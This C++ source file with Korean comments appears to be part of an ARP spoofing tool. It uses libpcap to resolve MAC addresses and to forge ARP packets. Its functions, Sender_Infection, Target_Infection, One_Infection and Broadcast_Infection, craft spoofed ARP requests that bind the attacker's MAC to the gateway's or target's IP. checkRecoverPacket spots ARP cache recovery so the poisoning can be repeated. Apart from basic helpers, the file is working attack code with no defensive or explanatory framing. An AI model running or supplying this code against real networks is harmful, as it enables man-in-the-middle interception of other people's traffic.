#include "utill.h"

#define MAC_ALEN 6
#define MAC_ADDR_LEN 6



bool sendPacket(pcap_t *handle, const u_char *packet, size_t packetSize) {
    char errbuf[PCAP_ERRBUF_SIZE];
    int res = pcap_sendpacket(handle, packet, packetSize);
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return false;
    }
    return true;
}

void check_arp_reply(u_char* param, const struct pcap_pkthdr* header, const u_char* pkt_data){
    struct EthHdr *eh = (struct EthHdr*)pkt_data;
    if (eh->type() == EthHdr::Arp){
        struct ArpHdr *ah = (struct ArpHdr*)(eh+1);
        if (ah->op() == ArpHdr::Reply) {
            Mac* mac = reinterpret_cast<Mac*>(param);
            *mac = ah->smac();
        }
    }
}

Mac get_mac(pcap_t *handle, const u_char *packet, size_t packetSize){
    if (!sendPacket(handle, packet, packetSize)){
        return Mac::nullMac();
    }
    Mac mac;
    pcap_loop(handle, 1, check_arp_reply, reinterpret_cast<u_char*>(&mac));
    return mac;
}


Mac getTargetMac(Mac myMac, Ip myIp, Ip targetIp, char *interfcae_name)
{
    EthArpPacket packet;
    packet = Make_packet(interfcae_name, Mac::broadcastMac(), myMac, myMac, myIp, Mac::nullMac(), targetIp);
    Mac TragetMac;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interfcae_name, BUFSIZ, 1, 10, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", interfcae_name, errbuf);
        return Mac::nullMac();
    }

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    else
    {
        struct pcap_pkthdr *header;
        const u_char *packet;
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 1)
        {
            // 패킷 수신에 성공한 경우, ARP 응답 패킷에서 해당 IP 주소의 MAC 주소를 추출합니다.
            EthArpPacket *arpResponsePacket = reinterpret_cast<EthArpPacket *>(const_cast<u_char *>(packet));
            TragetMac = arpResponsePacket->arp_.smac_;
        }
    }
    pcap_close(handle);
    return TragetMac;
}

EthArpPacket Sender_Infection(char *interfaceName, Mac my_mac, Mac SenderMac, Ip sip, Ip tip)
{

    EthArpPacket packet;
    packet = Make_packet(interfaceName, SenderMac, my_mac, my_mac, tip, SenderMac, sip);
    return packet;
}

EthArpPacket Target_Infection(char *interfaceName, Mac my_mac, Mac Target_Mac, Ip sip, Ip tip)
{
    EthArpPacket packet;
    packet = Make_packet(interfaceName, Target_Mac, my_mac, my_mac, sip, Target_Mac, tip);
    return packet;
}

EthArpPacket One_Infection(char *interfaceName, Mac my_mac, Mac Sender_Mac, Ip sip, Ip tip)
{
    EthArpPacket packet;
    packet = Make_packet(interfaceName, Sender_Mac, my_mac, my_mac, tip, Sender_Mac, sip);
    return packet;
}

EthArpPacket Broadcast_Infection(char *interfaceName, Mac my_mac, Ip tip)
{
    EthArpPacket packet;
    packet = Make_packet(interfaceName, Mac::broadcastMac(), my_mac, Mac::randomMac(), tip, Mac::nullMac(), tip);
    return packet;
}

EthArpPacket normal_packet(char *interfaceName, Mac my_mac, Ip sip, Ip my_ip)
{
    EthArpPacket packet;
    packet = Make_packet(interfaceName, Mac::broadcastMac(), my_mac, my_mac, my_ip, Mac::nullMac(), sip);
    return packet;
}

EthArpPacket Make_packet(char *interfaceName,
                         Mac eth_dmac,
                         Mac eth_smac,
                         Mac arp_smac,
                         Ip arp_sip,
                         Mac arp_tmac,
                         Ip arp_tip)
{

    EthArpPacket packet;

    char errbuf[PCAP_ERRBUF_SIZE];

    packet.eth_.dmac_ = eth_dmac; // Sender MAC
    packet.eth_.smac_ = eth_smac; // 내 MAC
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);

    packet.arp_.smac_ = arp_smac;      // 내 MAC
    packet.arp_.sip_ = htonl(arp_sip); // gateway ip , Input
    packet.arp_.tmac_ = arp_tmac;      // sender MAC
    packet.arp_.tip_ = htonl(arp_tip); // sender IP

    return packet;
}

bool checkRecoverPacket(EthArpPacket &packet, Ip SenderIP, Ip TargetIp, Mac TargetMac, Mac SenderMac)
{
    if (packet.eth_.type() == EthHdr::Arp)
    {
        if (packet.arp_.op() == ArpHdr::Request || packet.arp_.op() == ArpHdr::Reply)
        {
            if (packet.arp_.sip() == SenderIP || packet.arp_.sip() == TargetIp)
            {
                if (packet.arp_.tmac() == TargetMac || packet.arp_.tmac() == SenderMac || packet.arp_.tmac() == Mac::nullMac())
                {
                    return true;
                }
            }
        }
    }
    return false;
}


// Ip getAttackerIp(char *interfaceName)
// {
//     int fd = socket(AF_INET, SOCK_DGRAM, 0); // 소켓 생성

//     ifreq ifr{};                                    // ifreq 구조체 생성
//     strncpy(ifr.ifr_name, interfaceName, IFNAMSIZ); // 인터페이스 이름 설정
//     ioctl(fd, SIOCGIFADDR, &ifr);                   // IP 주소 가져오기
//     close(fd);                                      // 소켓 닫기

//     struct sockaddr_in *sockaddr = reinterpret_cast<struct sockaddr_in *>(&ifr.ifr_addr);
//     char ipBuffer[INET_ADDRSTRLEN];                                       // IP 주소를 저장할 버퍼
//     inet_ntop(AF_INET, &(sockaddr->sin_addr), ipBuffer, INET_ADDRSTRLEN); // IP 주소를 문자열로 변환하여 저장
//     printf("Attacker Ip : %s\n", ipBuffer);

//     return Ip(ipBuffer);
// }